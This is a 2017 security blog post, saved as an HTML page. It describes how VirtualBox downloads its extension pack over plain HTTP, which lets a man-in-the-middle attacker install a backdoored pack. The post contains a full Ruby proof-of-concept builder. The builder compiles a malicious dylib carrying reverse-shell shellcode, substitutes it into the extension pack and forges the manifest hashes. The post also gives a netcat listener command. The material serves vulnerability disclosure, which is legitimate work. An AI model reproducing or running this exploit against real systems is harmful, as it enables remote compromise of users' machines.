@@ -1,0 +1,422 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+        <link rel="stylesheet" type="text/css" href="/css/style.css" />
+        <link rel="alternate" type="application/rss+xml" title="m4.rkw.io blog" href="http://m4.rkw.io/blog/rss" />
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+        <script src='https://www.google.com/recaptcha/api.js'></script>
+        <script src="/js/site.js"></script>
+        <title>Mark Wadham</title>
+    </head>
+    <body>
+        <div id="menu">
+                        <h3>Mark Wadham</h3>
+            <ul>
+                <li><a href="/index.html">profile</a></li>
+                <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
+                <li><a href="/cves.html">CVEs</a></li>
+                <li><a href="/jsdemos.html">js demos</a></li>
+                <li><a href="/contact.html">contact</a></li>
+                <li class="space small">twitter: <a href="https://twitter.com/m4rkw">m4rkw</a></li>
+                <li class="small">github: <a href="https://github.com/m4rkw">m4rkw</a></li>
+                <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
+                <li class="red space small"></li>
+            </ul>
+
+        </div>
+        <div id="content">
+            <div id="main-content">
+                                            <div class="post">
+                <h2><a href="/blog/owning-virtualbox-via-mitm.html">Owning VirtualBox via MITM</a></h2>
+                <h3>30 Nov 2017 08:25  | <a class="tag" href="/blog/tag/macOS.html">macOS</a> | <a class="tag" href="/blog/tag/security.html">security</a></h3>
+                  <pre>VirtualBox is a virtualisation application written by Oracle that is quite popular
+presumably because its free. I&#39;m not a fan myself - if my mac locks up
+completely or kernel panics it&#39;s usually because I&#39;ve loaded the vbox kernel
+extensions less than 10 minutes ago. I use VMware Fusion instead (which is fairly
+expensive but IMO worth the money) and have a ritual whereby if I&#39;ve had to load
+the vbox kernel extensions for work-related reasons I will reboot the machine
+before doing anything else.
+
+I discovered back in May that if certain conditions are met it&#39;s possible to
+achieve RCE in the VirtualBox application if you can MITM a user&#39;s traffic. This
+is possible because, bizarrely, VirtualBox downloads updates over plain http:
+
+<img src="https://m4.rkw.io/img/vbox_nossl.png" />
+
+This is true for both the pkg installer (which carries an Apple Developer code
+signature, making tampering with it tricky) and also for the multi-architecture
+extension pack, which has no code signature.
+
+<img src="https://m4.rkw.io/img/vbox_nossl2.png" />
+
+Despite reporting this to Oracle nearly 7 months ago they still haven&#39;t managed
+to put an SSL certificate on the download site. Hopefully this advisory will
+make people aware of the issue and encourage them to manually verify the
+checksum of the extension pack should they be in a situation where they&#39;ve
+downloaded it manually.
+
+Little Snitch shows that vbox does talk to update.virtualbox.org over https to
+retrieve the version information, but the extension pack itself is downloaded
+over http.
+
+<img src="https://m4.rkw.io/img/vbox_ls.png" />
+
+The extension pack for macOS is a gzipped tarball containing these files:
+
+ExtPack-license.html
+ExtPack-license.rtf
+ExtPack-license.txt
+ExtPack.manifest
+ExtPack.signature
+ExtPack.xml
+PXE-Intel.rom
+darwin.amd64
+linux.amd64
+linux.x86
+solaris.amd64
+win.amd64
+win.x86
+
+ExtPack.signature looked interesting and potentially would thwart this attack
+vector but at the time of writing it simply contains the string &quot;todo&quot; LOL.
+
+$ cat ExtPack.signature
+todo
+
+In the darwin.amd64 directory we have a bunch of dylibs:
+
+$ ls -1 darwin.amd64/
+VBoxEhciR0.r0
+VBoxEhciR3.dylib
+VBoxEhciRC.rc
+VBoxHostWebcam.dylib
+VBoxNvmeR0.r0
+VBoxNvmeR3.dylib
+VBoxNvmeRC.rc
+VBoxPuelMain.dylib
+VBoxUsbCardReaderR3.dylib
+VBoxUsbWebcamR3.dylib
+VBoxVRDP.dylib
+VDPluginCrypt.dylib
+
+These are dynamic libraries that VirtualBox loads in order to add additional
+functionality. With a dylib you can define a custom constructor which will get
+executed as soon as the dylib is loaded. Something like this:
+
+--------------------------------------
+__attribute__((constructor))
+void customConstructor(int argc, char **argv)
+{
+  system(&quot;touch /tmp/LOL&quot;);
+}
+--------------------------------------
+
+If VirtualBox loads this, the code in the constructor will get executed. The
+extpack also has a manifest file which, bizarrely, contains hashes for all of
+the dylibs in a handful of different hash formats.
+
+$ grep VBoxEhciR3.dylib ExtPack.manifest
+MD5 (darwin.amd64/VBoxEhciR3.dylib) = d3fddbcadfa01e4f9ccd2e23de119c3f
+SHA256 (darwin.amd64/VBoxEhciR3.dylib) =
+f8692e2223ef6b90b84011b437f38873a907933ab6f822e6301d0d4e65427e0a
+SHA512 (darwin.amd64/VBoxEhciR3.dylib) =
+42750441b2054f3b63937e6e54f58af72978091adbe4c5efc18b04f429d84c07ca0818af1f361c0b53dec62b157d3e042a60ae030bfd7e147de73c19de694670
+SHA1 (darwin.amd64/VBoxEhciR3.dylib) = 0eef387c4de5441aa0623ae677ff8f0c21002f46
+SIZE (darwin.amd64/VBoxEhciR3.dylib) = 90064
+
+Oh and they also list the size for good measure lol :P
+
+So if we roll a fake dylib into an extpack tarball and set the size and hashes
+correctly, if the user clicks on the extpack VirtualBox will install it without
+any verification and then load the dylib and execute the constructor as soon as
+the user starts a VM.
+
+There is a catch though, although Vbox will install our modified extpack without
+verification when we click on it manually, the update mechanism performs a
+sha256 hash check.
+
+The update process for vbox is:
+
+1) Older version (eg 5.1.20) is launched, the user is prompted to download the
+newest version.  The link provided here is <a href="http:// so this alone could be">http:// so this alone could be</a>
+intercepted and modified, but it would require a developer cert to sign a new
+pkg bundle for the user to install.
+
+2) After installing the new version, on the next launch it will prompt the user
+to install the new extpack for 5.1.22.  The API call to update.virtualbox.org
+happens over SSL so we can&#39;t mess with the version numbers or the hashes that
+correspond to the new extpack.
+
+Now if we MITM the request to download.virtualbox.org and send our hacked
+extpack, VirtualBox says:
+
+<img src="https://m4.rkw.io/img/vbox_reject.png" />
+
+So it&#39;s telling us to download it manually from the website.  A user seeing
+this probably wouldn&#39;t suspect anything other than an Oracle mishap so they
+would likely hop over to virtualbox.org to download the extpack manually. The
+website does say &quot;check the hashes&quot; and provides SHA256 and MD5 checksums (which
+are served over SSL).
+
+The website www.virtualbox.org is served over SSL.. but the download link for
+the extension pack points to download.virtualbox.org over <a href="http://. This is bad">http://. This is bad</a>
+because it means we can leave www.virtualbox.org un-messed-with so the user sees
+the SSL load correctly (and is lulled into a false sense of security because of
+the SSL padlock), but still MITM download.virtualbox.org in order to send our
+hacked payload.
+
+The filename for the extpack as its linked on the website is slightly different
+to the one requested by the application but we can still intercept it, and since
+it was downloaded manually vbox doesn&#39;t verify the signature and just merrily
+installs it, allowing us to compromise the host.  Of course if a user is
+paranoid enough to check the hashes then they&#39;ll notice something is wrong, but
+how many users are realistically going to do that?
+
+Amusingly, on installation it warns you to only install extension packs that you
+got from a trusted source - like, I dunno, say, the website of a trusted (?!)
+vendor THAT HAS ITS OWN CERTIFICATE AUTHORITY that you just loaded over SSL?
+
+As soon as any VM is started the code in our malicious dylib gets executed as
+the user running VirtualBox on the host machine.
+
+Obviously this will only work if the user doesn&#39;t have the latest version, as
+otherwise there would be no reason for them to download an extpack. However vbox
+updates are fairly frequent so an attacker waiting around with MITM capability
+probably wouldn&#39;t have to wait too long before being able to execute this
+attack.
+
+The PoC code below downloads the latest extension pack from the VirtualBox
+website and modifies it with a reverse tcp shellcode backdoor that will be
+executed as soon as a VM is started.
+
+To test it you can simply click on it to install it into virtualbox, listen for
+a shell with nc, eg:
+
+$ nc -l 5555
+
+and then start any vm.
+
+<a href="https://m4.rkw.io/vbox_extpack_builder.rb.txt">https://m4.rkw.io/vbox_extpack_builder.rb.txt</a>
+6148d6aa7ad2896ae3679ed8e2ff46e7156fd9db9c9ef39fa4116c9566848606
+----------------------------------------------------------------------------
+#!/usr/bin/env ruby
+
+# RCE PoC builder for VirtualBox extension packs
+# Tested with version 5.2.2 on 30/11/17
+#
+# Discovered by m4rkw, shouts to #coolkids
+# PoC is for darwin.amd64 but other architectures are likely vulnerable
+#
+# This builds a backdoored extension pack which VirtualBox will happily install.
+# Once installed, when an OSX/64bit VM is started it will trigger the shellcode
+# and initiate a connectback shell.
+#
+# Thanks to Jacob Hammack for the shellcode
+
+require &#39;digest&#39;
+
+puts
+puts &quot;RCE PoC builder for VirtualBox extension pack&quot;
+puts &quot;discovered by m4rkw, shouts to #coolkids&quot;
+puts
+puts &quot;PoC is for darwin.amd64 but other architectures may be vulnerable&quot;
+puts
+puts &quot;This builds a backdoored extension pack which VirtualBox will happily install.&quot;
+puts &quot;Once installed, when any VM is started it will trigger the shellcode and&quot;
+puts &quot;initiate a connectback shell to the specified IP and port&quot;
+puts
+puts &quot;Thanks to Jacob Hammack for the shellcode&quot;
+puts
+
+if ARGV.length &lt; 2
+  puts &quot;Usage: #{__FILE__} &lt;ip&gt; &lt;port&gt;&quot;
+  puts
+  exit 0
+end
+
+target_dylib = &quot;VBoxEhciR3.dylib&quot;
+
+puts &quot;compiling attack.dylib...&quot;
+
+File.open(&quot;attack.c&quot;,&quot;w&quot;) do |f|
+  f.write(&quot;#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;unistd.h&gt;
+
+int (*sc)();
+
+char target_ip[] = \&quot;#{ARGV[0]}\&quot;;
+short target_port = #{ARGV[1]};
+
+char shellcode[] =
+  \&quot;\\x41\\xB0\\x02\\x49\\xC1\\xE0\\x18\\x49\\x83\\xC8\\x61\\x4C\\x89\\xC0\\x48\&quot;
+  \&quot;\\x31\\xD2\\x48\\x89\\xD6\\x48\\xFF\\xC6\\x48\\x89\\xF7\\x48\\xFF\\xC7\\x0F\&quot;
+  \&quot;\\x05\\x49\\x89\\xC4\\x49\\xBD\\x01\\x01\\x11\\x5C\\xFF\\xFF\\xFF\\xFF\\x41\&quot;
+  \&quot;\\xB1\\xFF\\x4D\\x29\\xCD\\x41\\x55\\x49\\x89\\xE5\\x49\\xFF\\xC0\\x4C\\x89\&quot;
+  \&quot;\\xC0\\x4C\\x89\\xE7\\x4C\\x89\\xEE\\x48\\x83\\xC2\\x10\\x0F\\x05\\x49\\x83\&quot;
+  \&quot;\\xE8\\x08\\x48\\x31\\xF6\\x4C\\x89\\xC0\\x4C\\x89\\xE7\\x0F\\x05\\x48\\x83\&quot;
+  \&quot;\\xFE\\x02\\x48\\xFF\\xC6\\x76\\xEF\\x49\\x83\\xE8\\x1F\\x4C\\x89\\xC0\\x48\&quot;
+  \&quot;\\x31\\xD2\\x49\\xBD\\xFF\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x49\\xC1\\xED\&quot;
+  \&quot;\\x08\\x41\\x55\\x48\\x89\\xE7\\x48\\x31\\xF6\\x0F\\x05\&quot;;
+
+__attribute__((constructor))
+void customConstructor(int argc, char **argv)
+{
+  struct in_addr ip;
+  char *tp = (char *)&amp;target_port;
+
+  shellcode[38] = tp[1];
+  shellcode[39] = tp[0];
+
+  inet_aton(target_ip, (struct in_addr *)&amp;ip);
+  memcpy((char *)&amp;shellcode[40], (char *)&amp;ip.s_addr, 4);
+
+  void *ptr = mmap(0, 0x33, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
+
+  if (ptr == MAP_FAILED) {
+    perror(\&quot;mmap\&quot;);
+    exit(-1);
+  }
+  memcpy(ptr, shellcode, sizeof(shellcode));
+  sc = ptr;
+
+  sc();
+}
+&quot;)
+end
+
+system(&quot;clang -dynamiclib -std=gnu99 attack.c -o attack.dylib&quot;)
+File.delete(&quot;attack.c&quot;)
+
+if !File.exist? &quot;vbox_exp_temp&quot;
+  Dir.mkdir(&quot;vbox_exp_temp&quot;)
+end
+Dir.chdir(&quot;vbox_exp_temp&quot;)
+
+puts &quot;looking for latest extpack at virtualbox.org...&quot;
+
+downloads_html = `curl -s <a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a>`
+
+match = downloads_html.match(/http:\/\/download\.virtualbox\.org\/virtualbox\/[\d\.]+\/Oracle_VM_VirtualBox_Extension_Pack[\d\.\-]+\.vbox-extpack/)
+
+if !match or !match[0]
+  puts &quot;failed to find <a href="http:// link to the extpack.&quot">http:// link to the extpack.&quot</a>;
+  exit 1
+end
+
+puts &quot;downloading extpack... &quot;
+
+filename = match[0].split(&quot;/&quot;)[-1]
+
+system(&quot;curl -s #{match[0]} -o #{filename}&quot;)
+
+puts &quot;unpacking extpack... &quot;
+
+system(&quot;tar zxf #{filename}&quot;)
+File.delete(filename)
+
+puts &quot;substituting #{target_dylib}... &quot;
+
+File.delete(&quot;darwin.amd64/#{target_dylib}&quot;)
+File.rename(&quot;../attack.dylib&quot;, &quot;darwin.amd64/#{target_dylib}&quot;)
+
+puts &quot;patching manifest... &quot;
+
+File.open(&quot;ExtPack.manifest.new&quot;,&quot;w&quot;) do |f|
+  File.read(&quot;ExtPack.manifest&quot;).chomp.split(&quot;\n&quot;).each do |line|
+    r = target_dylib.gsub(&#39;.&#39;,&#39;\.&#39;)
+
+    if (match = line.match(/\A(MD5|SHA256|SHA512|SHA1|SIZE) \(darwin\.amd64\/#{r}\)/))
+      case match[1]
+      when &quot;MD5&quot;
+        md5 = Digest::MD5.hexdigest File.read(&quot;darwin.amd64/#{target_dylib}&quot;)
+        f.write(&quot;MD5 (darwin.amd64/#{target_dylib}) = #{md5}\n&quot;)
+      when &quot;SHA256&quot;
+        sha256 = Digest::SHA256.hexdigest File.read(&quot;darwin.amd64/#{target_dylib}&quot;)
+        f.write(&quot;SHA256 (darwin.amd64/#{target_dylib}) = #{sha256}\n&quot;)
+      when &quot;SHA512&quot;
+        sha512 = Digest::SHA512.hexdigest File.read(&quot;darwin.amd64/#{target_dylib}&quot;)
+        f.write(&quot;SHA512 (darwin.amd64/#{target_dylib}) = #{sha512}\n&quot;)
+      when &quot;SHA1&quot;
+        sha1 = Digest::SHA1.hexdigest File.read(&quot;darwin.amd64/#{target_dylib}&quot;)
+        f.write(&quot;SHA1 (darwin.amd64/#{target_dylib}) = #{sha1}\n&quot;)
+      when &quot;SIZE&quot;
+        size = File.size &quot;darwin.amd64/#{target_dylib}&quot;
+        f.write(&quot;SIZE (darwin.amd64/#{target_dylib}) = #{size}\n&quot;)
+      end
+    else
+      f.write(line + &quot;\n&quot;)
+    end
+  end
+end
+
+File.delete(&quot;ExtPack.manifest&quot;)
+File.rename(&quot;ExtPack.manifest.new&quot;, &quot;ExtPack.manifest&quot;)
+
+puts &quot;creating tarball... &quot;
+system(&quot;tar -zcf ../#{filename} *&quot;)
+
+Dir.chdir(&quot;..&quot;)
+system(&quot;rm -rf vbox_exp_temp&quot;)
+
+puts &quot;\ncreated backdoored extpack: #{filename}\n\n&quot;</pre>
+            </div>
+
+
+            </div>
+            <div id="right-content">
+                
+            <ul>
+              <li>&nbsp;&nbsp;<a href="/blog.html">all posts</a>
+            </ul>
+
+            <ul>
+              <li>&nbsp;&nbsp;[year]</li>
+                <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2018.html">2018</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2017.html">2017</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2016.html">2016</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2015.html">2015</a></li>
+            </ul>
+
+            <ul>
+              <li>&nbsp;&nbsp;[tag]</li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/AWS.html">AWS</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/agile.html">agile</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/apple.html">apple</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/bash.html">bash</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/cryptocurrency.html">cryptocurrency</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/iOS.html">iOS</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/linux.html">linux</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/macOS.html">macOS</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/mining.html">mining</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/mysql.html">mysql</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/php.html">php</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/ruby.html">ruby</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/scrum.html">scrum</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/security.html">security</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/touchID.html">touchID</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/vim.html">vim</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/work.html">work</a></li>
+            </ul>
+
+            </div>
+        </div>
+				<script>
+						(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+						(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+						m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+						})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+						ga('create', 'UA-91604161-1', 'auto');
+						ga('send', 'pageview');
+				</script>
+    </body>
+</html>
